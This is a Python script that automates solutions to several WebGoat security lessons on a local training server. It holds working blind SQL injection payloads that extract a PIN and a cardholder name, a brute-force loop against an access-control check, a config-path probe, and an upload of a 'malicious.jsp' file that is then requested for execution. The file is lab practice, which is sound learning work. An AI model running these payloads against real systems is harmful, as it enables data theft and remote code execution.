#!/usr/bin/env python
# -*- coding:utf-8 -*-

import utils.tools as tools
import utils.mitmSql as mitmSql
import utils.concurrency as concurrency
import string
from requests_toolbelt.multipart.encoder import MultipartEncoder
import requests

#Access Control Flaws_Using an Access Control Matrix
def test_ACF_one():
    url = "http://localhost/WebGoat/attack?Screen=7&menu=200"
    params = {
    "User":"",
    "Resource":"",
    "SUBMIT":"Check Access"
    }
    cookies = {
        "name":"JSESSIONID",
        "value":"3C5844601B61289CBBDE83F302598D76"
    }
    auth = ('guest','guest')
    judge = "Congratulations. You have successfully completed this lesson."
    changeUser = [
        'Moe',
        'Larry',
        'Curly',
        'Shemp'
    ]
    selectResource=[
        'Public Share',
        'Time Card Entry',
        'Performance Review',
        'Time Card Approval',
        'Site Manager',
        'Account Manager'
    ]
    mark = 0
    condition = [changeUser,selectResource]
    conditionComb = tools.tools_compose(*condition)
    http_send = tools.ToolsRequests()
    http_send.set_url(url)
    #http_send.set_cookie(cookies)
    #http_send.set_auth(auth)
    headers = mitmSql.mitm_get_headers_by_system_name("mitmhttp",'localhost')
    http_send.set_headers(headers)
    for user,account in conditionComb:
        params["User"] =user
        params["Resource"] = account
        http_send.set_params(params)
        r = http_send.send_post()
        if r.text.find(judge) > 0:
            print("可越权访问的用户:"+params["User"])
            print("管理员账户:"+params['Resource'])
            mark = 1
            break
    if mark == 0:
        print('请求访问错误!')
def concurrency_func(username):
    print(username)
    url = "http://localhost/WebGoat/attack?Screen=17&menu=800"
    http_send = tools.ToolsRequests()
    http_send.set_url(url)
    headers = mitmSql.mitm_get_headers_by_system_name("mitmhttp",'localhost')
    http_send.set_headers(headers)
    params = {}
    params['username'] = username
    params['SUBMIT'] = 'Submit'
    http_send.set_params(params)
    r = http_send.send_post()
    #print(r.text)
    #Account information for user: dave
    if r.text.find('Account information for user: dave') > 0:
        print("dave!")
    elif r.text.find('Account information for user: jeff') > 0:
        print("jeff!")
def test_concurrenc_one():
    t = concurrency.Concurrency(concurrency_func,0,2,['jeff','dave'])
    t.run()
def test_Blind_Numeric_SQL_Injection():
    '''
    sql盲注，基于返回值的正确或者错误，定位正确数据
    '''
    url = "http://localhost/WebGoat/attack?Screen=56&menu=1100"
    params = {
        'account_number':'',
        'SUBMIT':'Go'
    }
    exploit = '''101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444') = '''
    exploit_supply = " )"
    judge = "Account number is valid"
    http_send = tools.ToolsRequests()
    http_send.set_url(url)
    headers = mitmSql.mitm_get_headers_by_system_name("mitmhttp",'localhost')
    http_send.set_headers(headers)
    for n in range(2000,2500):
        params['account_number'] = exploit+str(n)+exploit_supply
        http_send.set_params(params)
        r = http_send.send_post()
        if r.text.find(judge) > 0:
            print("正确的pin:"+str(n))
def test_Blind_String_SQL_Injection():
    url = "http://localhost/WebGoat/attack?Screen=15&menu=1100"  
    exploit = '''101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'),  '''
    exploit_supply_b = ", 1) ="
    exploit_supply_l = "'"
    exploit_supply_r = "')"
    result = []
    judge = "Account number is valid"
    http_send = tools.ToolsRequests()
    http_send.set_url(url)
    headers = mitmSql.mitm_get_headers_by_system_name("mitmhttp",'localhost')
    http_send.set_headers(headers)
    params = {
        'account_number':'',
        'SUBMIT':'Go'
    }
    for i in range(4):
        for n in string.ascii_letters:
            params['account_number'] = exploit+str(i+1)+exploit_supply_b+exploit_supply_l+n+exploit_supply_r
            http_send.set_params(params)
            r = http_send.send_post()
            if r.text.find(judge)>0:
                result.append(n)
    print("正确的名字:"+''.join(result))
def test_Denial_of_Service():
    url = "http://localhost/WebGoat/attack?Screen=3&menu=1200"
    params = {
        ' Username':'',
        'Password':'',
        'SUBMIT':'Login'
    }
    userList = ['jsnow','jdoe','jplane']
    pwList = ['passwd1','passwd2','passwd3']
    http_send = tools.ToolsRequests()
    http_send.set_url(url)
    headers = mitmSql.mitm_get_headers_by_system_name("mitmhttp",'localhost')
    http_send.set_headers(headers)    
    for i in range(len(userList)):
        params['Username'] = userList[i]
        params['Password'] = pwList[i]
        http_send.set_params(params)
        r = http_send.send_post()
def test_Insecure_Configuration():
    browsing = ['config','configuration','conf']
    url = 'http://localhost/WebGoat/'
    http_send = tools.ToolsRequests()
    headers = mitmSql.mitm_get_headers_by_system_name("mitmhttp",'localhost')
    http_send.set_headers(headers)
    for b in browsing:
        url_b = url + b
        print(url_b)
        http_send.set_url(url_b)
        r = http_send.send_get()
        print(r.status_code)
def test_malicious_execution():
    url = "http://localhost/WebGoat/attack?Screen=49&menu=1600"
    exec_url = "http://localhost/WebGoat/uploads/malicious.jsp"
    exec_headers = {}
    exec_file = "./utils/execfile/malicious.jsp"
    headers = mitmSql.mitm_get_headers_by_system_name("mitmhttp",'localhost')
    m = MultipartEncoder(
        fields = {
            "file":('malicious.jsp',open(exec_file,'rb'),'application/octet-stream'),
            'SUBMIT':'Start Upload'
        }
    )
    headers['Content-Type'] = m.content_type
    r = requests.post(url,data=m,headers=headers)
    exec_headers['User-Agent'] = headers['User-Agent']
    exec_headers['Cookie'] = headers['Cookie']
    exec_headers['Authorization'] = headers['Authorization']
    r = requests.get(exec_url,headers=exec_headers)
    print(r)
if __name__ == "__main__":
    #test_ACF_one()
    #test_Blind_Numeric_SQL_Injection()
    #test_Blind_String_SQL_Injection()
    #test_Denial_of_Service()
    #test_Insecure_Configuration()
    test_malicious_execution()